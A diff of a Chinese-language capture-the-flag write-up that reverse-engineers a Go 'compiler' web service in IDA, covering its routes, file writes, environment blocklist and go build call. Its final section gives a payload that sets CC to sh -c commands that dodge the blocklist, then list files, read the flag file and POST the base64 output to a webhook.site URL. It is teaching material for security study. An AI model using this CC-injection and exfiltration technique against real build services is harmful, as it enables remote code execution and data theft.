@@ -15,6 +15,7 @@ https://pkg.go.dev/os/exec
 
 先從入口main.main開始看
 
+
 `net_http__ptr_ServeMux_Handle` 他會設置route的handler
 包括 "/mygolang"、"/itsmygo" 和"/"
 https://pkg.go.dev/net/http#ServeMux.HandleFunc
@@ -27,322 +28,379 @@ http.HandleFunc("/foo", func(w http.ResponseWriter, r *http.Request) {
 
 ida如下
 ```c
-  v7.tab = (runtime_itab *)net_http_DefaultServeMux;
-  v7.data = "/mygolang";
-  v9.len = (int)&go_itab_net_http_HandlerFunc_comma_net_http_Handler;
-  v9.cap = (int)&pattern;
-  net_http__ptr_ServeMux_Handle(v7, (net_http_ServeMux *)9, *(string *)&v9.len);
-  v7.tab = (runtime_itab *)net_http_DefaultServeMux;
-  v7.data = "/itsmygo";
-  v9.len = (int)&go_itab_net_http_HandlerFunc_comma_net_http_Handler;
-  v9.cap = (int)&off_6C48C8;
-  net_http__ptr_ServeMux_Handle(v7, (net_http_ServeMux *)8, *(string *)&v9.len);
-  v7.tab = (runtime_itab *)net_http_DefaultServeMux;
-  v7.data = (void *)"/";
-  v9.len = (int)&go_itab_net_http_HandlerFunc_comma_net_http_Handler;
-  v9.cap = (int)&off_6C48C0;
-  net_http__ptr_ServeMux_Handle(v7, (net_http_ServeMux *)buf, *(string *)&v9.len);
+  v9.tab = (runtime_itab *)net_http_DefaultServeMux;
+  v9.data = &unk_69727F;
+  v11.len = (int)&go_itab_net_http_HandlerFunc_comma_net_http_Handler;
+  v11.cap = (int)&pattern;
+  net_http__ptr_ServeMux_Handle(v9, (net_http_ServeMux *)9, *(string *)&v11.len);
+  v9.tab = (runtime_itab *)net_http_DefaultServeMux;
+  v9.data = &unk_696DD9;
+  v11.len = (int)&go_itab_net_http_HandlerFunc_comma_net_http_Handler;
+  v11.cap = (int)&off_6C4930;
+  net_http__ptr_ServeMux_Handle(v9, (net_http_ServeMux *)8, *(string *)&v11.len);
+  v9.tab = (runtime_itab *)net_http_DefaultServeMux;
+  v9.data = "/";
+  v11.len = (int)&go_itab_net_http_HandlerFunc_comma_net_http_Handler;
+  v11.cap = (int)&off_6C4928;
+  net_http__ptr_ServeMux_Handle(v9, (net_http_ServeMux *)&unk_1, *(string *)&v11.len);
 ```
 
 這東西跟處理filehandler有關係的，他也創建了一個route /static/，並要求他當一個prefix
 https://pkg.go.dev/net/http#StripPrefix
 ```c
-  v7.tab = (runtime_itab *)runtime_newobject((runtime__type *)&RTYPE_http_fileHandler);
-  v7.tab->inter = (runtime_interfacetype *)&go_itab_net_http_Dir_comma_net_http_FileSystem;
-  v7.tab->_type = (runtime__type *)&off_70B6B0;
-  v7.data = (void *)8;
-  v1 = &go_itab__ptr_net_http_fileHandler_comma_net_http_Handler;
-  v9.len = (int)v7.tab;
-  v7.tab = (runtime_itab *)"/static/";
-  net_http_StripPrefix(v7, *(net_http_Handler *)&v9.len, *(string *)&v9.cap);
-  v9.len = (int)v7.tab;
-  v9.cap = 8LL;
-  v7.tab = (runtime_itab *)net_http_DefaultServeMux;
-  v7.data = (void *)"/static/";
-  net_http__ptr_ServeMux_Handle(v7, (net_http_ServeMux *)8, *(string *)&v9.len);
+  v9.tab = (runtime_itab *)runtime_newobject((runtime__type *)&RTYPE_http_fileHandler);
+  v9.tab->inter = (runtime_interfacetype *)&go_itab_net_http_Dir_comma_net_http_FileSystem;
+  v9.tab->_type = (runtime__type *)&off_70B7D0;
+  v9.data = (void *)8;
+  v2 = &go_itab__ptr_net_http_fileHandler_comma_net_http_Handler;
+  v11.len = (int)v9.tab;
+  v9.tab = (runtime_itab *)&handler;
+  net_http_StripPrefix(v9, *(net_http_Handler *)&v11.len, *(string *)&v11.cap);
+  v11.len = (int)v9.tab;
+  v11.cap = 8LL;
+  v9.tab = (runtime_itab *)net_http_DefaultServeMux;
 ```
-
-之後他輸出了一些資訊，輸出東西在v9，v9.array指向off_70B6C0
+off_70B7E0，應該是印出跟開在哪個host 或是 port，等等的資訊
 ```c
+  v9.data = (void *)&handler;
+  net_http__ptr_ServeMux_Handle(v9, (net_http_ServeMux *)8, *(string *)&v11.len);
   a.array = (interface_ *)&RTYPE_string_0;
-  a.len = (int)&off_70B6C0;
-  v7.data = os_Stdout;
-  v7.tab = (runtime_itab *)&go_itab__ptr_os_File_comma_io_Writer;
-  v9.array = (interface_ *)&a;
-  v9.len = 1LL;
-  v9.cap = 1LL;
-  fmt_Fprintln(v7, v9);
-```
-off_70B6C0，應該是印出跟開在哪個host 或是 port，等等的資訊
-```c
-.rodata:000000000070B6C0 off_70B6C0      dq offset aServerStartedO
-.rodata:000000000070B6C0                                         ; DATA XREF: main_main+FD↑o
-.rodata:000000000070B6C0                                         ; "Server started om port http://localhost"...
+  a.len = (int)&off_70B7E0;
+  v9.data = os_Stdout;
+  v9.tab = (runtime_itab *)&go_itab__ptr_os_File_comma_io_Writer;
+  v11.array = (interface_ *)&a;
+  v11.len = 1LL;
+  v11.cap = 1LL;
+  fmt_Fprintln(v9, v11);
 ```
 
-設定 listen 在哪個 port (unk_6963EC)
+off_70B7E0
+```
+.rodata:000000000070B7E0 off_70B7E0      dq offset aServerStartedO
+.rodata:000000000070B7E0                                         ; DATA XREF: main_main+FD↑o
+.rodata:000000000070B7E0                                         ; "Server started om port http://localhost"...
+```
+
+設定 listen 在哪個 port (unk_69871D) `.rodata:000000000069871D a000020000      db '0.0.0.0:20000'      ; DATA XREF: main_main+13D↑o`
 ```c
   p_http_Server = (http_Server *)runtime_newobject((runtime__type *)&RTYPE_http_Server);
-  p_http_Server->Addr.len = 5LL;
-  p_http_Server->Addr.ptr = (char *)&unk_6963EC;
-  p_http_Server->Handler = v0;
-  v3 = net_http__ptr_Server_ListenAndServe(p_http_Server);
+  p_http_Server->Addr.len = 13LL;
+  p_http_Server->Addr.ptr = (char *)&unk_69871D;
+  p_http_Server->Handler = v1;
+  v4 = net_http__ptr_Server_ListenAndServe(p_http_Server);
 ```
+看到這邊web server setting其實差不多了，接下來去分析其他地方，這裡我們直接鎖定重點
 
-看到這邊其實差不多了，接下來去分析其他地方，這裡我們直接鎖定重點
 main.mygoooHandler
 這裡根據網站是處理compiler的頁面
 ```c
-  if ( r->Method.len == 4 && *(_DWORD *)r->Method.str == 'TSOP' )
+if ( r->Method.len == 4 && *(_DWORD *)r->Method.str == 'TSOP' )
 ```
 POST會進入到if，否則直接顯示該頁面
 以下是complier 透過 POST method處理邏輯
 處理跟user request有關，錯誤就印出ERROR
+
+看到以下他先創建了一個 Object叫做 CompileRequest
+https://pkg.go.dev/github.com/open-policy-agent/opa/test/e2e#TestRuntime.CompileRequest
+
+也創建了 json_Decoder object 並針對傳入的 body (POST data)去做操作
+https://pkg.go.dev/encoding/json#Decoder
+
+之後就調用 JSON 解碼器的 Decode 方法
+
 ```c
-    USERrequest._type = (runtime__type *)&RTYPE__ptr_main_CompileRequest;
-    USERrequest.data = _req;
-    tab = encoding_json__ptr_Decoder_Decode((encoding_json_Decoder *)p_json_Decoder, USERrequest).tab;
-    if ( tab )
-    {
-      *(_OWORD *)&a.m256_f32[4] = v2;
-      *(_QWORD *)a.m256_f32 = &RTYPE_string_0;
-      *(_QWORD *)&a.m256_f32[2] = &off_70B680;
-      *(_QWORD *)&a.m256_f32[4] = tab->_type;
-      *(_QWORD *)&a.m256_f32[6] = &RTYPE__ptr_main_CompileRequest;
-      v32.data = os_Stdout;
-      v32.tab = (runtime_itab *)&go_itab__ptr_os_File_comma_io_Writer;
-      v42.array = (interface_ *)&a;
-      v42.len = 2LL;
-      v42.cap = 2LL;
-      fmt_Fprintln(v32, v42);
-      v5 = w_8;
-      v42.array = (interface_ *)&::w;
-      v42.len = 5LL;
-      v42.cap = 400LL;
-      net_http_Error(code, *(net_http_ResponseWriter *)&v42.array, *(string *)&v42.len);
-    }
+    ra = r;
+    w_8 = w.data;
+    code = (int)w.tab;
+    _req = (main_CompileRequest_0 *)runtime_newobject((runtime__type *)&RTYPE_main_CompileRequest_0);
+    _req->Code.ptr = 0LL;
+    data = ra->Body.data;
+    v21.len = (int)runtime_convI2I((runtime_interfacetype *)&RTYPE_io_Reader_0, ra->Body.tab);
+    p_json_Decoder = (json_Decoder *)runtime_newobject((runtime__type *)&RTYPE_json_Decoder);
+    p_json_Decoder->r.tab = (void *)v21.len;
+    if ( *(_DWORD *)&runtime_writeBarrier.enabled )
+      runtime_gcWriteBarrierDX();
+    else
+      p_json_Decoder->r.data = data;
+    v52._type = (runtime__type *)&RTYPE__ptr_main_CompileRequest;
+    v52.data = _req;
+    tab = encoding_json__ptr_Decoder_Decode((encoding_json_Decoder *)p_json_Decoder, v52).tab;
 ```
 
-他會去生成Random hash，這是負責生成檔案名稱隨機值
+decode出問題則進入，並輸出error(這邊其實看組語更清楚)
+![image](https://hackmd.io/_uploads/HJWrKo84yx.png)
+
+這邊可以更清楚看到進入到error分支
+![image](https://hackmd.io/_uploads/ry-FtjUVyl.png)
+
+
+
+這裡是顯示的頁面
+```c
+.rodata:000000000069B88B aStaticMygolang db './static/mygolang.html'
+
+    v42.str = (uint8 *)&byte_69B88B;
+    v42.len = 22LL;
+    net_http_ServeFile(w, r, v42);
+```
+
+如果decode正確繼續則往下走，這部分會去生成Random hash，這是負責生成檔案名稱隨機值
 ```c
       RandomHash = main_generateRandomHash();
       if ( RandomHash._r1.tab )
       {
-        *(_OWORD *)&v26.m256_f32[4] = v2;
-        *(_QWORD *)v26.m256_f32 = &RTYPE_string_0;
-        *(_QWORD *)&v26.m256_f32[2] = &off_70B680;
-        *(_QWORD *)&v26.m256_f32[4] = RandomHash._r1.tab->_type;
-        *(_QWORD *)&v26.m256_f32[6] = RandomHash._r1.data;
-        v33.data = os_Stdout;
-        v33.tab = (runtime_itab *)&go_itab__ptr_os_File_comma_io_Writer;
-        v43.array = (interface_ *)&v26;
-        v43.len = 2LL;
-        v43.cap = 2LL;
-        fmt_Fprintln(v33, v43);
-        v6 = w_8;
-        v43.array = (interface_ *)&::w;
-        v43.len = 5LL;
-        v43.cap = 500LL;
-        net_http_Error(code, *(net_http_ResponseWriter *)&v43.array, *(string *)&v43.len);
-```
-透過實際執行跟ida的內容不難知道./userFile會儲存兩種檔案.json .go
-並且檔案名稱會加入上方生成出來的hash值
-v36 -> "./userFile"
-fmt -> v36("%s/%s_env.json") -> v45是format string的值，往上追指向v28.m256_f32 再往上就會知道是 先前的v36 就是 "./userFile"
-第二個format string是 v36.str = name.str; ，而name.str是random值(在v28.m256_f32另一個offset地方)
-
-最後可以組成 ./userFile/<random 值>.json
-
-
-
-```c
-          *(_OWORD *)v28.m256_f32 = v2;
-          *(_OWORD *)&v28.m256_f32[4] = v2;
-          v36.str = (uint8 *)"./userFile";
-          v36.len = 10LL;
-          v36.str = (uint8 *)runtime_convTstring(v36);
-          *(_QWORD *)v28.m256_f32 = &RTYPE_string_0;
-          *(_QWORD *)&v28.m256_f32[2] = v36.str;
-          v36.str = name.str;
-          v36.len = (int)&RTYPE__ptr_main_CompileRequest;
-          v36.str = (uint8 *)runtime_convTstring(v36);
-          *(_QWORD *)&v28.m256_f32[4] = &RTYPE_string_0;
-          *(_QWORD *)&v28.m256_f32[6] = v36.str;
-          v36.str = (uint8 *)"%s/%s_env.json";
-          v36.len = 14LL;
-          v45.len = 2LL;
-          v45.cap = 2LL;
-          v45.array = (interface_ *)&v28;
-          name.len = (unsigned __int64)fmt_Sprintf(v36, v45).str;
-          v37._type = (runtime__type *)&RTYPE_map_string_string_0;
+        *(_OWORD *)&v27.m256_f32[4] = v3;
+        *(_QWORD *)v27.m256_f32 = &RTYPE_string_0;
+        *(_QWORD *)&v27.m256_f32[2] = &off_70B7A0;
+        *(_QWORD *)&v27.m256_f32[4] = RandomHash._r1.tab->_type;
+        *(_QWORD *)&v27.m256_f32[6] = RandomHash._r1.data;
 ```
 
-之後用writefile寫東西到該檔案，寫進去的值是req.env
-v51 = encoding_json_Marshal(v37); -> v37.data = _req->Env;
-看一下前端就是個json
-可以存環境變數
+透過實際執行跟ida的內容不難知道./userFile會儲存兩種檔案.json .go 並且檔案名稱會加入上方生成出來的hash值 
+
+接下來可以看到hash randon的值會被拿來幹嘛
+這邊建一張表方便對應上面一些value是哪些string
+
+|變數|value|
+|---|---|
+|byte_6977B6|./userFile|
+|byte_698B34|%s/%s_env.json|
+
+name是random hash的value
 ```c
-          v51._r1.tab = (runtime_itab *)v51._r0.len;
-          v51._r1.data = (void *)v51._r0.cap;
-          v51._r0.len = 14LL;
-          v51._r0.cap = (int)v51._r0.array;
-          v51._r0.array = (uint8 *)name.len;
-          v9 = os_WriteFile(*(string *)&v51._r0.array, *(_slice_uint8 *)&v51._r0.cap, 0x1A4u);
+name.str = RandomHash._r0.str;
+```
+v39先是`./userFile`，之後丟給`v29.m256_f32[2]`(想像成array的第一個值)
+接著name被丟給v39之後丟給`v29.m256_f32[6]`，v29給v48，v39後來則拿到`%s/%s_env.json`，被丟入到fmt_Sprintf
+最後變成 `fmt_Sprintf("%s/%s_env.json", "./userFile", <random hash>)`
+並把串好的值丟回給name
+這裡就可以知道這邊組成了一個路徑，你在source code中也可以清楚的看到該目錄
+
+https://pkg.go.dev/fmt
+
+```c
+          *(_OWORD *)v29.m256_f32 = v3;
+          *(_OWORD *)&v29.m256_f32[4] = v3;
+          v39.str = (uint8 *)&byte_6977B6;
+          v39.len = 10LL;
+          v39.str = (uint8 *)runtime_convTstring(v39);
+          *(_QWORD *)v29.m256_f32 = &RTYPE_string_0;
+          *(_QWORD *)&v29.m256_f32[2] = v39.str;
+          v39.str = name.str;
+          v39.len = (int)&RTYPE__ptr_main_CompileRequest;
+          v39.str = (uint8 *)runtime_convTstring(v39);
+          *(_QWORD *)&v29.m256_f32[4] = &RTYPE_string_0;
+          *(_QWORD *)&v29.m256_f32[6] = v39.str;
+          v39.str = (uint8 *)&byte_698B34;
+          v39.len = 14LL;
+          v48.len = 2LL;
+          v48.cap = 2LL;
+          v48.array = (interface_ *)&v29;
+          name.len = (unsigned __int64)fmt_Sprintf(v39, v48).str;
 ```
 
-接下來另外一個也一樣，基本上也是先用format string確立要寫的檔案位置
-./userFile/<random>.go
-追一下他是收req.code相關的
-這邊也不難看出是寫入golang程式碼，並存起來
+之後就是做json_Marshal(對傳入的req->Env)，他是一個可以去循環遍歷的一個function，將傳入的資料轉成Json，之後去做writefile
+看一下writefile的長相
+`WriteFile(filename string, data []byte, perm fs.FileMode)`
+這邊基本上可以確定的是req->Env被丟入後轉成json被寫入到userFile下
+https://pkg.go.dev/encoding/json#Marshal
+https://pkg.go.dev/io/ioutil#WriteFile
+
 ```c
-            *(_OWORD *)v28.m256_f32 = v2;
-            *(_OWORD *)&v28.m256_f32[4] = v2;
-            v39.str = (uint8 *)"./userFile";
-            v39.len = 10LL;
-            v39.str = (uint8 *)runtime_convTstring(v39);
-            *(_QWORD *)v28.m256_f32 = &RTYPE_string_0;
-            *(_QWORD *)&v28.m256_f32[2] = v39.str;
-            v39.str = name.str;
-            v39.len = (int)&RTYPE__ptr_main_CompileRequest;
-            v39.str = (uint8 *)runtime_convTstring(v39);
-            *(_QWORD *)&v28.m256_f32[4] = &RTYPE_string_0;
-            *(_QWORD *)&v28.m256_f32[6] = v39.str;
-            v39.str = (uint8 *)"%s/%s.go";
-            v39.len = 8LL;
-            v47.len = 2LL;
-            v47.cap = 2LL;
-            v47.array = (interface_ *)&v28;
-            v20.str = fmt_Sprintf(v39, v47).str;
-            v47.array = (interface_ *)_req->Code.len;
+          v40._type = (runtime__type *)&RTYPE_map_string_string_0;
+          v40.data = _req->Env;
+          v54 = encoding_json_Marshal(v40);
+          v54._r1.tab = (runtime_itab *)v54._r0.len;
+          v54._r1.data = (void *)v54._r0.cap;
+          v54._r0.len = 14LL;
+          v54._r0.cap = (int)v54._r0.array;
+          v54._r0.array = (uint8 *)name.len;
+          v10 = os_WriteFile(*(string *)&v54._r0.array, *(_slice_uint8 *)&v54._r0.cap, 0x1A4u);
+```
+
+這邊我一樣列出對應關係，不過基本上跟上面一樣
+|變數|value|
+|---|---|
+|byte_6977B6|./userFile|
+|byte_696DA9|%s/%s.go|
+
+這邊基本上可以確定的是req->Code被寫入到userFile下(一個.go)
+```c
+            *(_OWORD *)v29.m256_f32 = v3;
+            *(_OWORD *)&v29.m256_f32[4] = v3;
+            v42.str = (uint8 *)&byte_6977B6;
+            v42.len = 10LL;
+            v42.str = (uint8 *)runtime_convTstring(v42);
+            *(_QWORD *)v29.m256_f32 = &RTYPE_string_0;
+            *(_QWORD *)&v29.m256_f32[2] = v42.str;
+            v42.str = name.str;
+            v42.len = (int)&RTYPE__ptr_main_CompileRequest;
+            v42.str = (uint8 *)runtime_convTstring(v42);
+            *(_QWORD *)&v29.m256_f32[4] = &RTYPE_string_0;
+            *(_QWORD *)&v29.m256_f32[6] = v42.str;
+            v42.str = (uint8 *)&byte_696DA9;
+            v42.len = 8LL;
+            v50.len = 2LL;
+            v50.cap = 2LL;
+            v50.array = (interface_ *)&v29;
+            v21.str = fmt_Sprintf(v42, v50).str;
+            v50.array = (interface_ *)_req->Code.len;
             ptr = _req->Code.ptr;
-            v47 = (_slice_interface_)runtime_stringtoslicebyte((runtime_tmpBuf *)buf, *(string *)&v47.array);
-            v47.len = v12;
-            v47.cap = (int)v47.array;
-            v40.len = 8LL;
-            v47.array = v13;
-            v40.str = v20.str;
-            v14 = os_WriteFile(v40, (_slice_uint8)v47, 0x1A4u);
+            v50 = (_slice_interface_)runtime_stringtoslicebyte((runtime_tmpBuf *)buf, *(string *)&v50.array);
+            v50.len = v13;
+            v50.cap = (int)v50.array;
+            v43.len = 8LL;
+            v50.array = v14;
+            v43.str = v21.str;
+            v15 = os_WriteFile(v43, (_slice_uint8)v50, 0x1A4u);
 ```
 
-之後call main_mygoooHandler_func1
-這部分重點就兩個
+之後就進了`main_mygoooHandler_func1`
 ```c
-os_Setenv(*(string *)it.key, *(string *)it.elem);
+              v17 = (runtime_funcval *)runtime_newobject((runtime__type *)&stru_67DD20);
+              v17->fn = (uintptr)main_mygoooHandler_func1;
+              v17[2].fn = 14LL;
 ```
-先去讀檔，把env json讀出來
-之後他會去設定os env
-另外還可以觀察到他設定了timeout(context_WithTimeout)，應該是跟時間設定有關的，這邊如果之後解題有細心觀察應該會發現
-	
+
+進重點先提一下這個，這是為了防止他在你的command卡住所以設了timeout，你在解題時就會發現，你用curl他其實會重複好幾次，但在遠端跑可能只Request兩三次就斷開就是這個原因
+https://pkg.go.dev/context#WithTimeout
 ```c
-  v4 = File._r1_2.data;
-  File = os_ReadFile(*(string *)(&v4 - 1));
-  if ( w.tab )
-  {
-    *(_OWORD *)&a.m256_f32[4] = v1;
-    *(_QWORD *)a.m256_f32 = &RTYPE_string_0;
-    *(_QWORD *)&a.m256_f32[2] = &off_70B680;
-    v2.tab = (runtime_itab *)w.tab->_type;
-    *(context_Context *)&a.m256_f32[4] = v2;
-    v59.data = os_Stdout;
-    v59.tab = (runtime_itab *)&go_itab__ptr_os_File_comma_io_Writer;
-    v67.array = (interface_ *)&a;
-    v67.len = 2LL;
-    v67.cap = 2LL;
-    v67 = (_slice_interface_)fmt_Fprintln(v59, v67);
-    HIBYTE(File._r0_2.cap) = 0;
-    (*v56)(v7, v8, v67.array);
-    return;
-  }
-  v35 = v6;
-  v34 = v4;
-  data.array = v5;
-  data.len = (int)runtime_newobject((runtime__type *)&RTYPE_map_string_string_0);
-  v9 = v35;
-  v58._type = (runtime__type *)&RTYPE__ptr_map_string_string;
-  v58.data = (void *)data.len;
-  array = data.array;
-  v11 = encoding_json_Unmarshal(*(_slice_uint8 *)(&v4 - 1), v58);
-  if ( v11.tab )
-  {
-    *(_OWORD *)&v47.m256_f32[4] = v1;
-    *(_QWORD *)v47.m256_f32 = &RTYPE_string_0;
-    *(_QWORD *)&v47.m256_f32[2] = &off_70B680;
-    *(_QWORD *)&v47.m256_f32[4] = v11.tab->_type;
-    *(_QWORD *)&v47.m256_f32[6] = v11.data;
-    v60.data = os_Stdout;
-    v60.tab = (runtime_itab *)&go_itab__ptr_os_File_comma_io_Writer;
-    v68.array = (interface_ *)&v47;
-    v68.len = 2LL;
-    v68.cap = 2LL;
-    v68 = (_slice_interface_)fmt_Fprintln(v60, v68);
-    HIBYTE(File._r0_2.cap) = 0;
-    (*v56)(v13, v14, v68.array);
-    return;
-  }
-  v12 = *(runtime_hmap **)data.len;
-  v31 = &v57;
-  ((void (__fastcall *)(char *))loc_46462B)((char *)&File + 368);
-  runtime_mapiterinit((runtime_maptype *)&RTYPE_map_string_string_0, v12, &it);
-  while ( it.key )
-  {
-    os_Setenv(*(string *)it.key, *(string *)it.elem);
-    runtime_mapiternext(&it);
-  }	
+  val = *(_QWORD *)(v0 + 48);
+  v50.str = *(uint8 **)(v0 + 8);
+  v106.tab = (runtime_itab *)context_background;
+  v106.data = (void *)10000000000LL;
+  v52 = context_WithTimeout((__int64)&go_itab__ptr_context_emptyCtx_comma_context_Context, v106, v3);
+  v50.len = (int)v106.tab;
+  v72 = (void (__golang **)(runtime_itab *, void *))v106.data;
+  str = v50.str;
 ```
-	
-之後他會去執行到 os_exec_Command
-並且上方也有設定 ./userEXE/random
-用來存儲使用者編譯的執行檔
-他會去執行
-byte_69601B -> go(0x67 0x6f)
-unk_6964C3 -> build (0x62 0x75 0x69 0x6C 0x64)
-unk_695F87 -> -o (0x2d 0x6f)
-也就是編譯一個檔案
+
+這部分重點就兩個第一部分
 ```c
-  *(_OWORD *)&v43.array = v1;
-  v61.str = (uint8 *)w.data;
-  v61.len = (int)File._r1.data;
-  v61.str = (uint8 *)runtime_convTstring(v61);
-  v43.array = (interface_ *)&RTYPE_string_0;
-  v43.len = (int)v61.str;
-  v61.str = (uint8 *)"./userEXE/%s";
-  v61.len = 12LL;
-  v69.len = 1LL;
-  v69.cap = 1LL;
-  v69.array = (interface_ *)&v43;
-  v15 = fmt_Sprintf(v61, v69).str;
-  arg.array = (string *)&unk_6964C3;
-  arg.len = 5LL;
-  arg.cap = (int)&unk_695F87;
-  v50 = 2LL;
-  v51 = v15;
-  v52 = 12LL;
-  v53 = v39;
-  v54 = v33;
-  if ( v40 )
-  {
-    v62.str = (uint8 *)&byte_69601B;
-    v62.len = 2LL;
-    p_arg = &arg;
-    p_data = 4LL;
-    v18 = 4LL;
-    v19 = (exec_Cmd *)os_exec_Command(v62, *(_slice_string *)(&p_data - 1));
-    v19->ctx.tab = v40;
-    if ( *(_DWORD *)&runtime_writeBarrier.enabled )
-    {
-      p_data = (__int64)&v19->ctx.data;
-      runtime_gcWriteBarrierCX();
+LABEL_39:
+      v43 = v15;
+      v51.len = (int)v14;
+      v33 = v14[1];
+      v98.str = (uint8 *)*v14;
+      v98.len = v33;
+      v34 = strings_Index(*(string *)&v12, v98);
+      v35 = v34 < 0;
+      if ( v34 >= 0 )
+        break;
+      v32 = v43 + 1;
+      if ( v43 + 1 >= 10 )
+      {
+        v35 = v34 < 0;
+        break;
+      }
     }
+    if ( !v35 )
+    {
+      v55[0] = &RTYPE_string_0;
+      v55[1] = &off_70B800;
+      v94.data = os_Stdout;
+      v94.tab = (runtime_itab *)&go_itab__ptr_os_File_comma_io_Writer;
+      v105.array = (interface_ *)v55;
+      v105.len = 1LL;
+      v105.cap = 1LL;
+      fmt_Fprintln(v94, v105);
+      v95.str = v50.str;
+      v95.len = (int)name;
+      os_Remove(v95);
+      v96.str = v51.str;
+      v96.len = v42;
+      v36 = os_Remove(v96);
+      HIBYTE(File._r0.cap) = 0;
+      (*v72)(v36.tab, v36.data);
+      return;
+    }
+    v81.str = (uint8 *)v47.len;
+    v81.len = (int)File._r1.data;
+    v97.str = (uint8 *)w.data;
+    v97.len = (int)File._r1.data;
+    os_Setenv(v81, v97);
+    runtime_mapiternext(&it);
+```
+這裡要關注的我們寫進去的json env做了甚麼，他被當成環境變數去做設定了
+https://pkg.go.dev/os#Setenv
+
+```c
+    v81.str = (uint8 *)v47.len;
+    v81.len = (int)File._r1.data;
+    v97.str = (uint8 *)w.data;
+    v97.len = (int)File._r1.data;
+    os_Setenv(v81, v97);
+    runtime_mapiternext(&it);
 ```
 
-逆向到這裡其實差不多了，簡單梳理流程就是
-送出 POST -> 將 request 的 env跟code存起來到檔案
-執行os setenv去更改環境變數(根據剛剛存的檔案也就是你輸入的環境變數)
-最後build你送進去的檔案
-這題就是任意控env跟code他會幫你編譯卻不會執行的題目
+寫進去的環境變數會去做檢查黑名單(檢查value是否有這些字串)，IDA在解析有跑掉，不過透過下方數字可以知道長度
+```c
+  ((void (__fastcall *)(char *))loc_464614)((char *)&File + 544);
+  v71[0] = (__int64)&unk_696023;
+  v71[1] = 2LL;
+  v71[2] = (__int64)"curlcx16";
+  v71[3] = 4LL;
+  v71[4] = (__int64)"whoami";
+  v71[5] = 6LL;
+  v71[6] = (__int64)&unk_696121;
+  v71[7] = 3LL;
+  v71[8] = (__int64)&unk_696029;
+  v71[9] = 2LL;
+  v71[10] = (__int64)&unk_69601B;
+  v71[11] = 2LL;
+  v71[12] = (__int64)&unk_696308;
+  v71[13] = 4LL;
+  v71[14] = (__int64)&stru_695F58.str + 6;
+  v71[15] = 1LL;
+  v71[16] = (__int64)"echoerms";
+  v71[17] = 4LL;
+  v71[18] = (__int64)&unk_69629C;
+  v71[19] = 4LL;
+```
+為何可以知道他是黑名單，因為這部分是檢查相關的，如果錯會噴error，或是可以透過error message直接知道這裡是黑名單
+![image](https://hackmd.io/_uploads/Bkq5H3wNJg.png)
 
+第二部分是看.go做了甚麼
+先看這裡
+```c
+    v56 = v2;
+    v82.str = v48;
+    v82.len = val;
+    v82.str = (uint8 *)runtime_convTstring(v82);
+    *(_QWORD *)&v56 = &RTYPE_string_0;
+    *((_QWORD *)&v56 + 1) = v82.str;
+    v82.str = (uint8 *)"./userEXE/%s";
+    v82.len = 12LL;
+    v101.len = 1LL;
+    v101.cap = 1LL;
+    v101.array = (interface_ *)&v56;
+    v16 = fmt_Sprintf(v82, v101).str;
+```
+這裡是把userEXE用fmt串成路徑
+這部分則是傳入arg，分別是
+byte_69601D(go)
+unk_6964D5(build)
+unk_695F87(-o)
+```c
+    arg.array = (string *)&unk_6964D5;
+    arg.len = 5LL;
+    arg.cap = (int)&unk_695F87;
+```
 
-## 如何攻擊
+最後被傳入os_exec_command，基本上到這裡就可以看出來
+傳進去的.go會被編譯成執行檔(go build -o "your.go")
+這裡會發現，你無法控os_exec_command，所以第一個坑點，Command injection不在這
+第二個坑點，你傳進去的.go不會被執行，所以沒有任意golang code執行
+```c
+  p_arg = &arg;
+  p_data = 4LL;
+  v19 = 4LL;
+  v20 = (exec_Cmd *)os_exec_Command(v83, *(_slice_string *)(&p_data - 1));
+```
+
+逆向到這裡其實差不多了，簡單梳理流程就是 送出 POST -> 將 request 的 env跟code存起來到檔案 執行os setenv去更改環境變數(根據剛剛存的檔案也就是你輸入的環境變數)，並去檢查你env的value是否吃黑名單，最後build你送進去的檔案 這題就是任意控env跟code他會幫你編譯卻不會執行的題目
+
+## attack
 這題目標要 RCE
 這邊可以先看看golang會有哪些環境變數
 輸入go env可以知道
@@ -655,6 +713,23 @@ cgo: cannot parse $WORK/b041/_cgo_.o as ELF, Mach-O, PE or XCOFF
 其實 golang官網有提到CC這個環境變數相關資料
 ![golang-official-cc](img/go_official.png)
 
-你是優秀的mygo工讀生
+## 最終payload
+Env CC
+```
+sh -c "cu${x}rl  https://webhook.site/f32eb628-6ee2-4cc5-85d6-23665880807f -X POST -d $(l${x}s /app|base64)"
+sh -c "cu${x}rl  https://webhook.site/f32eb628-6ee2-4cc5-85d6-23665880807f -X POST -d $(c${x}at /app/flag.mygo|base64|tr -d '\n')"
+```
+
+code
+```golang
+package main
+
+import "C"
+
+func main() {
+    println("Naup")
+}
+```
+
 
 > Flag: THJCC{MyGo!!!\!!https://www.youtube.com/channel/UC80p_16pSSHA8YmtCVdX51w_OuO_ItsMygo!!!!!🎤🎸🎸🥁🎸GolangsFuneral🎹}
